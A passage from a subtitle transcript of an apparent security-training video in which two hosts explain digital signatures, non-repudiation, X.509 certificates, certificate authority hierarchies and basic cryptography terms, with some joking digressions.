00:13:50.120\nAnd the fact that we can't\nsay that we didn't do that.\n\n271\n00:13:50.120 --> 00:13:52.890\nIs what proof of non repudiation is about.\n\n272\n00:13:52.890 --> 00:13:56.417\nNow interestingly,\nwe have to keep in mind something.\n\n273\n00:13:56.417 --> 00:13:59.643\nWhen I digitally sign an e-mail or\na document or\n\n274\n00:13:59.643 --> 00:14:04.565\nwhatever it is, I can validate through\nthis process that the private key\n\n275\n00:14:04.565 --> 00:14:08.775\nof the person claiming to do\nthe signature, was indeed used.\n\n276\n00:14:08.775 --> 00:14:09.575\n>> Right.\n\n277\n00:14:09.575 --> 00:14:11.265\n>> But, I can't validate who signed it.\n\n278\n00:14:11.265 --> 00:14:11.765\n>> That's right.\n\n279\n00:14:11.765 --> 00:14:13.835\n>> I don't know if it really was,\nfor instance Mike,\n\n280\n00:14:13.835 --> 00:14:17.730\nif it was Mike's key that was used,\nMeagan may have been substituting and\n\n281\n00:14:17.730 --> 00:14:20.761\nactually pretended to be Mike, she's been\nknown to do that when we're not in here.\n\n282\n00:14:20.761 --> 00:14:24.040\n[LAUGH]\n>> She looks all polite,\n\n283\n00:14:24.040 --> 00:14:27.800\nis very nice, she sits there quietly,\ndoesn't mess around, but when we're gone-\n\n284\n00:14:27.800 --> 00:14:28.790\n>> We go away and-\n\n285\n00:14:28.790 --> 00:14:30.170\n>> It's like a party in here.\n\n286\n00:14:30.170 --> 00:14:33.197\nShe's dancing around,\nshe's encrypting stuff, nobody's here,\n\n287\n00:14:33.197 --> 00:14:34.643\nshe's signing things, right?\n\n288\n00:14:34.643 --> 00:14:35.780\n>> [LAUGH]\n>> And\n\n289\n00:14:35.780 --> 00:14:37.350\njust all sorts of crazy stuff happens.\n\n290\n00:14:37.350 --> 00:14:41.150\nSo the problem is that maybe Megan\nactually purporting to be Mike,\n\n291\n00:14:41.150 --> 00:14:42.740\nin other words, pretending to be Mike.\n\n292\n00:14:42.740 --> 00:14:44.010\nBut it's really not.\n>> Cuz in most systems,\n\n293\n00:14:44.010 --> 00:14:46.250\nthat private key is stored\nin My User Profiles.\n\n294\n00:14:46.250 --> 00:14:49.070\nSo if I've left my system logged on,\nshe could come over here and\n\n295\n00:14:49.070 --> 00:14:51.430\nsit at my keyboard, sign an email as me.\n\n296\n00:14:51.430 --> 00:14:53.880\n>> And you may not know, right,\nunless I call up and say,\n\n297\n00:14:53.880 --> 00:14:55.510\nhey Mike, did you send that?\n\n298\n00:14:55.510 --> 00:14:56.790\nAnd or whatever.\n\n299\n00:14:56.790 --> 00:15:01.170\nSo we just wanna know that digital\nsignatures do not guarantee.\n\n300\n00:15:02.190 --> 00:15:04.520\nAnd there's really no\nguarantee to speak of anyway.\n\n301\n00:15:04.520 --> 00:15:07.440\nBut they do not guarantee\nbeyond a reasonable doubt\n\n302\n00:15:07.440 --> 00:15:11.730\nthat it was the actual Person who's\nprivate key was used that did the signing,\n\n303\n00:15:11.730 --> 00:15:13.600\nbut rather simply that\ntheir private key was used.\n\n304\n00:15:13.600 --> 00:15:14.328\n>> Yes.\n\n305\n00:15:14.328 --> 00:15:14.940\n>> And we don't know for\n\n306\n00:15:14.940 --> 00:15:19.420\nsure, unless we add additional\nfactors of authentication in.\n\n307\n00:15:19.420 --> 00:15:21.680\nSo we can do a digital signature, but\n\n308\n00:15:21.680 --> 00:15:26.810\nwe can match that to a biometric\nauthentication factor.\n\n309\n00:15:26.810 --> 00:15:30.510\nAdding additional complexity to\nthe process, but validating beyond\n\n310\n00:15:30.510 --> 00:15:34.230\na reasonable doubt that Mike had to be the\none that actually sat down and did that,\n\n311\n00:15:34.230 --> 00:15:38.550\nbecause it would be highly unlikely that\nsomebody could spoof Mike's biometric\n\n312\n00:15:38.550 --> 00:15:43.030\nsignature in the sense of iris scan or\nretina scan or something like that.\n\n313\n00:15:43.030 --> 00:15:43.750\nWe don't have a smoke or\n\n314\n00:15:43.750 --> 00:15:45.320\ncough as a biometric,\n>> Not yet.\n\n315\n00:15:45.320 --> 00:15:46.300\nWe gotta work on that.\n\n316\n00:15:46.300 --> 00:15:47.382\n>> We gotta work on that one.\n\n317\n00:15:47.382 --> 00:15:48.895\n>> [LAUGH]\n>> But we don't have that one yet.\n\n318\n00:15:48.895 --> 00:15:51.640\nSo, wouldnt' be that, but it could be\nany of the others that may occur, right?\n\n319\n00:15:51.640 --> 00:15:53.690\nSo that's the kind of thing\nthat we wanna think about withy\n\n320\n00:15:53.690 --> 00:15:55.380\na digital signature, okay?\n\n321\n00:15:55.380 --> 00:15:59.065\nSo asymmetric, we talked about\nthis public, privately key pair,\n\n322\n00:15:59.065 --> 00:16:01.079\npairing two keys together, right?\n\n323\n00:16:01.079 --> 00:16:04.828\nSo, when we have those, the rule as\na private key is always kept secure.\n\n324\n00:16:04.828 --> 00:16:07.047\nAs you said,\nusually stored inside the directory.\n\n325\n00:16:07.047 --> 00:16:09.691\nService as some kind, so,\nassociated with a user profile.\n\n326\n00:16:09.691 --> 00:16:11.039\nIt's a great way to think about it.\n\n327\n00:16:11.039 --> 00:16:14.947\nPublicly, it's put out there, again,\npublished through the same LDAP directory,\n\n328\n00:16:14.947 --> 00:16:17.530\nbut made available for\nanybody who wants to see it.\n\n329\n00:16:17.530 --> 00:16:19.526\nSo you may have servers, key servers,\n\n330\n00:16:19.526 --> 00:16:21.837\npublic key servers that\nexist on the the web.\n\n331\n00:16:21.837 --> 00:16:25.725\nPGP works this way, where you can download\nfrom public key servers to create what's\n\n332\n00:16:25.725 --> 00:16:26.611\ncalled a key ring.\n\n333\n00:16:26.611 --> 00:16:30.704\nSo I walk around with all those public\nkeys that I collect that I use often on\n\n334\n00:16:30.704 --> 00:16:33.953\na software-based key ring that\nI keep in my application.\n\n335\n00:16:33.953 --> 00:16:37.037\nSo things like that, but\nthat's what asymmetric cryptography is,\n\n336\n00:16:37.037 --> 00:16:39.056\nthe use of two\nmathematically related keys,\n\n337\n00:16:39.056 --> 00:16:41.677\none is called a private key,\none is called the public key.\n\n338\n00:16:42.777 --> 00:16:46.887\nOtherwise commonly referred to in\nthe Justice League of America as\n\n339\n00:16:46.887 --> 00:16:48.090\nthe Wonder Twins.\n\n340\n00:16:48.090 --> 00:16:49.422\n[CROSSTALK] It's all right, and\n\n341\n00:16:49.422 --> 00:16:52.092\nthen that stupid monkey Gleek\nwho kept running around, right?\n\n342\n00:16:52.092 --> 00:16:53.374\n>> I don't know about you, but\n\n343\n00:16:53.374 --> 00:16:56.957\nwe're there like overt sexual references\nhidden in that whole conversation,\n\n344\n00:16:56.957 --> 00:16:59.850\nbecause one of them was always\na vessel to receive something in.\n\n345\n00:16:59.850 --> 00:17:03.610\nThe other one was always\nlike a pail of water, right?\n\n346\n00:17:03.610 --> 00:17:06.570\nSo form of a pail, shape of water?\n\n347\n00:17:06.570 --> 00:17:09.610\nThat wasn't not at all right?\n\n348\n00:17:09.610 --> 00:17:10.520\nIt was the 70's.\n\n349\n00:17:10.520 --> 00:17:12.520\nIt was much cleaner and\nsimpler time back then.\n\n350\n00:17:12.520 --> 00:17:14.490\nRight?\nBecause I talked about this with a friend\n\n351\n00:17:14.490 --> 00:17:17.610\nof mine recently, and\nshe was basically saying,\n\n352\n00:17:17.610 --> 00:17:20.750\nshe's like isn't that like just,\ndid you get that whole thing.\n\n353\n00:17:20.750 --> 00:17:25.820\nLike wasn't it always just about like\nyou know the whole sexuality thing and\n\n354\n00:17:25.820 --> 00:17:26.690\nthe, no it wasn't.\n\n355\n00:17:26.690 --> 00:17:29.107\nIt was just,\nthat was just a bad choice scenario.\n\n356\n00:17:29.107 --> 00:17:32.960\n(CROSSTALK) But I mean think about\nit right one of them was like,\n\n357\n00:17:32.960 --> 00:17:35.320\nand they were like brother and\nsister or even worse.\n\n358\n00:17:35.320 --> 00:17:37.660\nThat was the worst part\nabout the whole thing.\n\n359\n00:17:37.660 --> 00:17:38.231\nRight?\nIt was crazy.\n\n360\n00:17:38.231 --> 00:17:40.050\n>> [LAUGH]\n>> It was the whole digital,\n\n361\n00:17:40.050 --> 00:17:42.210\nwell not digital rather,\nbut the disco age.\n\n362\n00:17:42.210 --> 00:17:42.810\n>> Yeah.\n>> There\n\n363\n00:17:42.810 --> 00:17:44.880\nwas a lot of craziness going on back then.\n\n364\n00:17:44.880 --> 00:17:46.540\nAll right, anyways, so\ndigital certificates.\n\n365\n00:17:46.540 --> 00:17:48.780\nLet's go back to what we\nwere talking about up there.\n\n366\n00:17:48.780 --> 00:17:52.890\nSo digital certificates, used to identify\nwhoever is the holder of certificate,\n\n367\n00:17:52.890 --> 00:17:56.740\nuniquely identifying them when doing\ntypically electronic transactions.\n\n368\n00:17:56.740 --> 00:18:02.387\nThe trick here is that the digital\ncertificate format is x.509v3.\n\n369\n00:18:02.387 --> 00:18:07.558\nx.509 is the working group standard\nname for digital certificates at IEEE,\n\n370\n00:18:07.558 --> 00:18:12.056\nand then V3, version 3 is that\ncurrent standard that we're using.\n\n371\n00:18:12.056 --> 00:18:17.743\nThe digital certificate is a identity\ndocument that allows us to,\n\n372\n00:18:17.743 --> 00:18:21.712\nessentially, carefully and legitimately.\n\n373\n00:18:21.712 --> 00:18:22.864\n[LAUGH] Carefully and\n\n374\n00:18:22.864 --> 00:18:27.488\nlegitimately identify the entire thought\nprocess just went off the rails here.\n\n375\n00:18:27.488 --> 00:18:30.140\n>> [LAUGH]\n>> I looked at the chat window and\n\n376\n00:18:30.140 --> 00:18:31.600\ncaught that comment.\n\n377\n00:18:31.600 --> 00:18:33.740\nBut, so let's get back to what\nwe were talking about here.\n\n378\n00:18:33.740 --> 00:18:37.500\nSo, I'll put on my straight face, and\nI'll try not to laugh and be focused here.\n\n379\n00:18:37.500 --> 00:18:39.020\nSo, digital certificates, right?\n\n380\n00:18:39.020 --> 00:18:39.870\nWe're talking about the idea,\n\n381\n00:18:39.870 --> 00:18:42.080\ncan you actually pull up the certificate\nwhile we're talking about that?\n\n382\n00:18:42.080 --> 00:18:42.750\n>> Yeah.\n>> I know we do that every\n\n383\n00:18:42.750 --> 00:18:43.310\ntime we talk about it.\n\n384\n00:18:43.310 --> 00:18:44.510\nIt's probably good to show people.\n\n385\n00:18:44.510 --> 00:18:46.990\nBut, we're talking about several specific\nthings with digital certificates.\n\n386\n00:18:46.990 --> 00:18:51.010\nNumber one, we're talking about the\nability to be able to ascribe identity,\n\n387\n00:18:51.010 --> 00:18:55.680\nclearly, and we're talking about the fact\nthat we're going to use some sort of\n\n388\n00:18:55.680 --> 00:18:58.700\na algorithm generally to\nrepresent our keys, so, our,\n\n389\n00:18:58.700 --> 00:19:01.650\nyour public key, and your private key,\nor digital representations of them\n\n390\n00:19:01.650 --> 00:19:04.755\nare going to be in your certificates,\nso we'll take a look at that.\n\n391\n00:19:04.755 --> 00:19:06.375\nWe also have a trust chain,\n\n392\n00:19:06.375 --> 00:19:09.615\na chain of trusts that's associated\nwith the certificate, based on issuance.\n\n393\n00:19:09.615 --> 00:19:13.015\nWe'll be getting into some PKI and\ntalking more about its, but\n\n394\n00:19:13.015 --> 00:19:15.885\ncertificates are used for\na variety of things.\n\n395\n00:19:15.885 --> 00:19:20.425\nWe can use them to digitally sign, we\ncan use them [LAUGH] it's not a problem,\n\n396\n00:19:20.425 --> 00:19:21.235\nnot at all.\n\n397\n00:19:21.235 --> 00:19:23.565\nNever apologize, never apologize.\n\n398\n00:19:23.565 --> 00:19:27.555\nIt's my fault for not being able to\nkeep my thought process going here, but\n\n399\n00:19:27.555 --> 00:19:28.890\nyour comment was perfectly fine.\n\n400\n00:19:28.890 --> 00:19:32.430\nSo you know we could do this for\ndigitally signing.\n\n401\n00:19:32.430 --> 00:19:36.970\nWe can do this for being able to validate\nthe identity of a software manufacturer.\n\n402\n00:19:36.970 --> 00:19:39.230\nDigitally singing and\nprotecting their code.\n\n403\n00:19:39.230 --> 00:19:41.170\nWe could do that to\nvalidate a web service.\n\n404\n00:19:41.170 --> 00:19:42.940\nA million reasons why we use certificates,\nright?\n\n405\n00:19:42.940 --> 00:19:45.420\nSo all of these are gonna be imported.\n\n406\n00:19:45.420 --> 00:19:48.510\nAnd when we look at the certificate,\n\n407\n00:19:48.510 --> 00:19:50.210\nwe can see that there's\na bunch of stuff there.\n\n408\n00:19:50.210 --> 00:19:53.990\nThere's a TTL, so essentially\na lifetime for the certificate,\n\n409\n00:19:53.990 --> 00:19:56.060\nso the expiration is gonna be there.\n\n410\n00:19:56.060 --> 00:19:57.770\nThe time of issuance is there.\n\n411\n00:19:57.770 --> 00:20:01.280\nWho wish you did and to what\ncircumstances, to who, for what purpose.\n\n412\n00:20:01.280 --> 00:20:05.330\nWe're also gonna see the certificate\nalgorithm that was used to the signing, so\n\n413\n00:20:05.330 --> 00:20:06.540\nthat's gonna be there.\n\n414\n00:20:06.540 --> 00:20:10.300\nWe're gonna see information\nabout the chain, and so\n\n415\n00:20:10.300 --> 00:20:14.360\nthe trust chain, we're gonna see the,\nyou can see they're V3, they're version 3.\n\n416\n00:20:14.360 --> 00:20:18.230\nThe signature algorithm,\nin this case SHA-256 with RSA Encryption,\n\n417\n00:20:18.230 --> 00:20:23.430\nwe're going to see validity period there,\nwe're going to see the public key info,\n\n418\n00:20:23.430 --> 00:20:26.500\nwe're going to see\nthe extensions that are used.\n\n419\n00:20:26.500 --> 00:20:30.075\nAll that kind of stuff is part of that,\nso it's gonna be important for\n\n420\n00:20:30.075 --> 00:20:33.975\nus to know that the certificate is really\na lot more than just that one sentence\n\n421\n00:20:33.975 --> 00:20:37.855\ndefinition that we kind of ascribe to it\nto make it real simple, because there's so\n\n422\n00:20:37.855 --> 00:20:41.650\nmuch stuff going on in there that we\njust really wanna recognize that,\n\n423\n00:20:41.650 --> 00:20:43.280\nthat it's a very complex thing.\n\n424\n00:20:43.280 --> 00:20:44.320\nWe wanna make sure we know that.\n\n425\n00:20:44.320 --> 00:20:48.590\nSo, that's the digital certificate,\noften stored in smart cards for instance.\n\n426\n00:20:48.590 --> 00:20:50.810\nRight?\nSo we can represent them and use them.\n\n427\n00:20:50.810 --> 00:20:54.910\nIf you have a Cat card, if you work\nin the government or the military,\n\n428\n00:20:54.910 --> 00:20:58.570\nif you have an ID that has a chip\nembedded in it in the back.\n\n429\n00:20:58.570 --> 00:21:02.710\nAnd you put that on a USB card reader,\nthose certificates typically are part\n\n430\n00:21:02.710 --> 00:21:06.370\nof that identity that's stored there and\nare used to validate who you are.\n\n431\n00:21:06.370 --> 00:21:11.040\nCertificate Authority and Registration\nAuthority, CA, RA, We're talking about\n\n432\n00:21:11.040 --> 00:21:14.600\nsome of the moving parts and components\nof PKI, public key infrastructure.\n\n433\n00:21:14.600 --> 00:21:16.730\nSo certificate authorities\nare kinda interesting.\n\n434\n00:21:16.730 --> 00:21:21.820\nWhat they allow us to do is, do we\nactually have a picture of [CROSSTALK]\n\n435\n00:21:21.820 --> 00:21:22.612\n>> No, you can't because you're now-\n\n436\n00:21:22.612 --> 00:21:23.643\n>> Yeah okay, I screwed up.\n\n437\n00:21:23.643 --> 00:21:25.257\nI should've planned for that-\n>> I do have one on my desktop\n\n438\n00:21:25.257 --> 00:21:25.893\nthough actually.\n\n439\n00:21:25.893 --> 00:21:26.860\n>> No, no problem.\n\n440\n00:21:26.860 --> 00:21:29.120\nWe'll pull that up when we do\nthe whole deep dive on [INAUDIBLE],\n\n441\n00:21:29.120 --> 00:21:30.090\nwe'll take a look at that.\n\n442\n00:21:30.090 --> 00:21:31.640\n>> Okay.\n>> Because we are gonna have that\n\n443\n00:21:31.640 --> 00:21:32.160\ndiscussion.\n\n444\n00:21:32.160 --> 00:21:35.030\nBut at a high level,\nthe idea is that we have,\n\n445\n00:21:35.030 --> 00:21:37.570\nwhat are known as certificate authorities,\nand there are two types.\n\n446\n00:21:37.570 --> 00:21:40.890\nWe can either have what's known\nas a root certificate authority,\n\n447\n00:21:40.890 --> 00:21:42.980\neither enterprise or standalone.\n\n448\n00:21:42.980 --> 00:21:45.010\nSo joined to a domain or\na directory or nod.\n\n449\n00:21:45.010 --> 00:21:47.430\nAnd then we have what's\nknown as a subordinate CA.\n\n450\n00:21:47.430 --> 00:21:49.720\nEssentially think of it as\na parent child relationship right,\n\n451\n00:21:49.720 --> 00:21:54.690\nand the hierarchy the parent is the root,\nthe child is the subordinate and\n\n452\n00:21:54.690 --> 00:21:58.610\nthe subordinate CA's are going to be\nable to actually issue certificates\n\n453\n00:21:58.610 --> 00:22:02.430\nto users and or computers and\ndevices that want them.\n\n454\n00:22:02.430 --> 00:22:07.480\nOn behalf of the root,\non behalf of the parent, the root CA\n\n455\n00:22:07.480 --> 00:22:12.530\ndoes not talk to users, or does not\ntalk to computers, directly normally.\n\n456\n00:22:12.530 --> 00:22:16.740\nYou may set up your own CA internally,\nlet's say a Microsoft infrastructure,\n\n457\n00:22:16.740 --> 00:22:17.630\nfor instance.\n\n458\n00:22:17.630 --> 00:22:20.640\nAnd you may issue your own\nCertificates in your own directory,\n\n459\n00:22:20.640 --> 00:22:23.900\nand you may simply just set up a root and\nnot bother with subordinates and\n\n460\n00:22:23.900 --> 00:22:26.580\njust have one system issuing\neverything and that's fine.\n\n461\n00:22:26.580 --> 00:22:29.550\nBut the way this is normally done when\nyou really build it out under best\n\n462\n00:22:29.550 --> 00:22:33.420\npractice conditions and with proper\nguidance, you set up the root CA.\n\n463\n00:22:33.420 --> 00:22:37.990\nThe root CA issues certificates\nonly to a subordinate CA or CAs.\n\n464\n00:22:37.990 --> 00:22:41.940\nThen the root CA is taken offline and\nthen the subordinate CAs are gonna do\n\n465\n00:22:41.940 --> 00:22:46.790\nthe business of issuing certificates,\njust that grinding away at hundreds,\n\n466\n00:22:46.790 --> 00:22:49.610\nthousands of requests throughout\nthe lifecycle of that system.\n\n467\n00:22:49.610 --> 00:22:52.350\nAnd that way we have the ability\nto be able to safeguard and\n\n468\n00:22:52.350 --> 00:22:54.220\nestablish that chain of trust.\n\n469\n00:22:54.220 --> 00:22:57.360\nAnd the other issue that we\naddress with that architecture is,\n\n470\n00:22:57.360 --> 00:23:01.820\nif a subordinate CA is compromised through\nhacking, the certificates associated with\n\n471\n00:23:01.820 --> 00:23:05.710\nthat subordinate CA are thought to\nbe compromised and must be revoked.\n\n472\n00:23:05.710 --> 00:23:08.570\nBut, not the entire trust\nchain is compromised,\n\n473\n00:23:08.570 --> 00:23:12.800\nbecause, if we allow the root CA to be\ncompromised, everything issued by it,\n\n474\n00:23:12.800 --> 00:23:16.960\nregardless of where it came from and\nwhen, is automatically suspect.\n\n475\n00:23:16.960 --> 00:23:19.280\nSo that's gonna be an issue, that's\nwhy we usually use these cutouts and\n\n476\n00:23:19.280 --> 00:23:20.280\ncreate a subordinate CA.\n\n477\n00:23:20.280 --> 00:23:24.850\nSo, the certificate authority overall,\nthe process is,\n\n478\n00:23:24.850 --> 00:23:28.440\nessentially those machines that\nare empowered to issue revoke and\n\n479\n00:23:28.440 --> 00:23:33.800\nmanage digital certificates, in some sort\nof hierarchical trust-oriented chain.\n\n480\n00:23:33.800 --> 00:23:37.560\nNow, the registration authority is\nan optional add-on traditionally,\n\n481\n00:23:37.560 --> 00:23:40.200\nmany PKI systems use it, many don't.\n\n482\n00:23:40.200 --> 00:23:44.390\nEspecially if you're doing something\nin the Microsoft world with PKI,\n\n483\n00:23:44.390 --> 00:23:47.750\nin an active directory forest you don't\nnormally have a registration authority\n\n484\n00:23:47.750 --> 00:23:48.960\nbroken out separately.\n\n485\n00:23:48.960 --> 00:23:52.340\nYou have your domain controller,\nand your certificate authority,\n\n486\n00:23:52.340 --> 00:23:56.805\nmaybe even on the same machine,\neven though that's not a good idea.\n\n487\n00:23:56.805 --> 00:23:59.610\n[INAUDIBLE] web enable that but,\nyou know, maybe a separate area but\n\n488\n00:23:59.610 --> 00:24:01.190\nessentially it does it all in one, right?\n\n489\n00:24:01.190 --> 00:24:04.693\nSo it all condensed, but\nthe RA can be broken up separately.\n\n490\n00:24:04.693 --> 00:24:09.221\nWhat the RA does essentially\nproxies need validation on\n\n491\n00:24:09.221 --> 00:24:13.087\nauthorization part of the process for\nthe CAs.\n\n492\n00:24:13.087 --> 00:24:17.875\nIt goes to the directory controllers,\nthe domain controllers, the provider and\n\n493\n00:24:17.875 --> 00:24:19.640\nit says, hey, who is this user?\n\n494\n00:24:19.640 --> 00:24:20.550\nAre they valid?\n\n495\n00:24:20.550 --> 00:24:21.720\nWho is this machine?\n\n496\n00:24:21.720 --> 00:24:24.880\nIs this a computer or\na device we have knowledge of and\n\n497\n00:24:24.880 --> 00:24:28.680\nit validates that authorizes in on and\nauthenticates to make sure\n\n498\n00:24:28.680 --> 00:24:32.710\nthat that information is legitimate\nbefore we allow you to get a certificate.\n\n499\n00:24:32.710 --> 00:24:36.590\nSo it goes and does the validation\nbefore we issue the certificate request.\n\n500\n00:24:36.590 --> 00:24:39.410\nAnd then, if it comes back and says yep,\n\n501\n00:24:39.410 --> 00:24:43.490\nyou're good the CA is then authorized\nto issue the certificate at that point.\n\n502\n00:24:43.490 --> 00:24:46.500\nSo the RA handles the heavy\nlifting of the backing and\n\n503\n00:24:46.500 --> 00:24:48.290\nthe validate identity essentially.\n\n504\n00:24:48.290 --> 00:24:50.670\nAnd also the claims that the person or\n\n505\n00:24:50.670 --> 00:24:53.840\nthe computer is making in order to make\nsure that those claims are accurate.\n\n506\n00:24:53.840 --> 00:24:57.390\nSo that's gonna be part of what\nhappens there, we have plaintext or\n\n507\n00:24:57.390 --> 00:25:00.020\ncleartext, Ciphertext or cryptogram.\n\n508\n00:25:00.020 --> 00:25:04.810\nThese essentially are going to allow\nus to just simply describe the ways in\n\n509\n00:25:04.810 --> 00:25:09.140\nwhich data is gonna exist in one form or\nanother at a certain point in the process.\n\n510\n00:25:09.140 --> 00:25:11.960\nPlaintext is what you're seeing\non the screen in front of you.\n\n511\n00:25:11.960 --> 00:25:15.780\nInformation that we use in\nthe cryptosystem as input\n\n512\n00:25:15.780 --> 00:25:19.890\nthat we then wanna ultimately apply\ncryptographic Protection still, right?\n\n513\n00:25:19.890 --> 00:25:24.870\nAnd plain text or clear text is simply\ngonna be that information before we\n\n514\n00:25:24.870 --> 00:25:28.610\nencipher it or cipher it in some way,\nrunning it through a system and\n\n515\n00:25:28.610 --> 00:25:31.940\nthen spinning out on a back end\ncipher text or a cryptogram.\n\n516\n00:25:31.940 --> 00:25:35.830\nWhich is the encrypted Crypted text after\nwe've applied some sort of cryptographic\n\n517\n00:25:35.830 --> 00:25:38.080\nprotection through\nan algorithm of some kind.\n\n518\n00:25:38.080 --> 00:25:41.750\nSo that's what plaintext, or cleartext,\nor ciphertext, or cryptograms are.\n\n519\n00:25:41.750 --> 00:25:44.630\nIt's essentially just add\nexisting one form or another.\n\n520\n00:25:44.630 --> 00:25:50.830\nThe cryptosystem is gonna represent the\nentire operational boundary of the device.\n\n521\n00:25:50.830 --> 00:25:54.280\nIn other words, whatever we are doing,\nstart to finish, nuts to bolts, or\n\n522\n00:25:54.280 --> 00:25:56.192\nbolts to nuts, or\nsoup to nuts, soup to bolts.\n\n523\n00:25:56.192 --> 00:25:59.481\n>> [LAUGH]\n>> I don't know, whatever it is, right?\n\n524\n00:25:59.481 --> 00:26:01.190\nAll that stuff start to finish.\n\n525\n00:26:01.190 --> 00:26:04.190\nThe entire cryptographic operation,\nthe algorithm, the keys,\n\n526\n00:26:04.190 --> 00:26:07.360\nkey management, everything it's all\npart of what we call the cryptosystem so\n\n527\n00:26:07.360 --> 00:26:10.020\njust know that, encryption and decryption.\n\n528\n00:26:10.020 --> 00:26:12.350\nWhen we encrypt we\nare taking plaintext and\n\n529\n00:26:12.350 --> 00:26:16.310\nwe're moving it through a system\napplying a cryptographic control to it,\n\n530\n00:26:16.310 --> 00:26:20.735\nknown as an algorithm, with a key,\ncreating ciphertext on the backside.\n\n531\n00:26:20.735 --> 00:26:21.540\n>> [INAUDIBLE]\n>> What?\n\n532\n00:26:21.540 --> 00:26:23.240\n>> A key,

right, so.\nEncryption.\n\n550\n00:26:47.102 --> 00:26:48.265\n>> Decryption.\n\n551\n00:26:48.265 --> 00:26:50.655\nThe essential process of\nrunning that in reverse.\n\n552\n00:26:50.655 --> 00:26:53.235\nTaking ciphertext running\nit back to through\n\n553\n00:26:53.235 --> 00:26:56.365\nthe cryptosystem to provide\non the back end plain text.\n\n554\n00:26:56.365 --> 00:26:58.210\nSo we can encrypt or decrypt the key or\n\n555\n00:26:58.210 --> 00:27:02.010\ncryptovariable the input that controls the\noperation of the cryptographic algorithm,\n\n556\n00:27:02.010 --> 00:27:05.300\nin plain old fashioned English\nit's the thing that makes it work.\n\n557\n00:27:05.300 --> 00:27:10.880\nWe have the key we can encrypt or\ndecrypt it if we don't we gotta find and\n\n558\n00:27:10.880 --> 00:27:13.240\nthat's what we do when we\ntry to break cryptosystems.\n\n559\n00:27:13.240 --> 00:27:14.705\nWe talked about non-repudiation.\n\n560\n00:27:14.705 --> 00:27:19.490\nNon-repudiation is something that we\nget from an integrity control and\n\n561\n00:27:19.490 --> 00:27:24.520\nthat is going to allow us to specify that\nwe did indeed engage in that behaviour and\n\n562\n00:27:24.520 --> 00:27:27.260\nalso allows us not to be able\nto claim that we did not.\n\n563\n00:27:27.260 --> 00:27:30.129\nIn other words, those are double\nnegative by the way not that we did not.\n\n564\n00:27:31.280 --> 00:27:35.670\nIt basically is a control that allows\neverybody to know that we did that.\n\n565\n00:27:35.670 --> 00:27:38.570\nAnd that there's no way for\nus to claim that we were not the person or\n\n566\n00:27:38.570 --> 00:27:39.970\nthe entity that did.\n\n567\n00:27:39.970 --> 00:27:43.240\nAlgorithm is the mathematical formula\nused to carry out encryption or\n\n568\n00:27:43.240 --> 00:27:45.460\ndecryption whatever that may be or\nhash it.\n\n569\n00:27:45.460 --> 00:27:47.270\nRight, so it's a mathematical construct.\n\n570\n00:27:47.270 --> 00:27:50.510\nCryptanalysis, study of techniques and\nor processes for\n\n571\n00:27:50.510 --> 00:27:52.966\nattempting to defeat\ncryptographic systems.\n\n572\n00:27:52.966 --> 00:27:55.010\nSo crypanalysis is essentially the art and\n\n573\n00:27:55.010 --> 00:27:57.880\nthe science of trying to break\ncryptosystems,that's what that is.\n\n574\n00:27:57.880 --> 00:28:00.370\nCryptology, the science dealing\nwith hidden, disguised, or\n\n575\n00:28:00.370 --> 00:28:01.950\nencrypted communications.\n\n576\n00:28:01.950 --> 00:28:04.840\nCryptology is the study of cryptography.\n\n577\n00:28:04.840 --> 00:28:08.360\nCryptanalysis is the study of\nhow to break cryptosystems\n\n578\n00:28:08.360 --> 00:28:10.650\nmaking sure we know\nthe difference between the two.\n\n579\n00:28:10.650 --> 00:28:15.060\nCollisions, collisions occur when we\nhave the same output being generated\n\n580\n00:28:15.060 --> 00:28:17.800\nfrom different inputs as we've\noften talked about that,\n\n581\n00:28:17.800 --> 00:28:19.590\nthat's a bad thing that's a pattern.\n\n582\n00:28:19.590 --> 00:28:23.850\nWe don't want collisions,\nwe don't want any kind of sameness,\n\n583\n00:28:23.850 --> 00:28:27.490\nany kind of pattern that we can\ndiscern to occur collisions are bad.\n\n584\n00:28:27.490 --> 00:28:30.540\nWhen collisions happen usually that\nmeans that we're gonna probably\n\n585\n00:28:30.540 --> 00:28:35.130\nmore often than not have an attack and\npotentially a successful one key space.\n\n586\n00:28:35.130 --> 00:28:39.380\nThe key space is gonna represent the total\nnumber of possible key Keys in the system.\n\n587\n00:28:39.380 --> 00:28:43.970\nSo the larger the key spaces we talked\nabout, the more likely it is it'll be\n\n588\n00:28:43.970 --> 00:28:47.590\nimpossible, or be very unlikely,\nthat somebody can guess the right key.\n\n589\n00:28:47.590 --> 00:28:53.520\nSo if you think about it, if we have\nlet's just say five potential keys,\n\n590\n00:28:53.520 --> 00:28:55.140\none through five.\n\n591\n00:28:55.140 --> 00:28:58.950\nAnd I encrypt my data with one of those\nfive keys and I don't tell you which\n\n592\n00:28:58.950 --> 00:29:02.190\nkey it is, but, I say,\nMike there's only five possible choices.\n\n593\n00:29:02.190 --> 00:29:04.352\nHow long do you think it's going to\ntake to figure out which one it is?\n\n594\n00:29:04.352 --> 00:29:05.482\n>> 30 seconds?\n\n595\n00:29:05.482 --> 00:29:09.310\n>> Probably not that long on\nterms of the amount of time.\n\n596\n00:29:09.310 --> 00:29:11.770\nSo, we would say that the work factor,\nright,\n\n597\n00:29:11.770 --> 00:29:15.180\nthe amount of time it takes to break\na protective measure is relatively small\n\n598\n00:29:15.180 --> 00:29:18.100\nbecause the key space is\nvery small in that example.\n\n599\n00:29:18.100 --> 00:29:22.315\nBut then if I add some keys and I say,\ninstead of five, I've got five million.\n\n600\n00:29:22.315 --> 00:29:23.310\n>> Mm-hm.\n\n601\n00:29:23.310 --> 00:29:25.160\n>> Multiply that out a few, right?\n\n602\n00:29:25.160 --> 00:29:26.690\n>> Right.\n>> And I say, okay Mike, go out, and\n\n603\n00:29:26.690 --> 00:29:28.150\nhow long do you think it's gonna take?\n\n604\n00:29:28.150 --> 00:29:29.230\n>> More than I have.\n\n605\n00:29:29.230 --> 00:29:30.560\nProbably longer than I like.\n\n606\n00:29:30.560 --> 00:29:31.670\n>> Probably more than 30 seconds, right?\n\n607\n00:29:31.670 --> 00:29:35.070\nMight still have to hand that down to\nsomebody and say, just keep going and\n\n608\n00:29:35.070 --> 00:29:36.080\ndo good work, right?\n\n609\n00:29:36.080 --> 00:29:37.190\nCuz chances are good.\n\n610\n00:29:37.190 --> 00:29:39.060\nIt's gonna take a very\nlong amount of time.\n\n611\n00:29:39.060 --> 00:29:42.010\nSo the work factor is gonna be very,\nvery long in that respect,\n\n612\n00:29:42.010 --> 00:29:43.680\nit's gonna be very high value,\nvery high 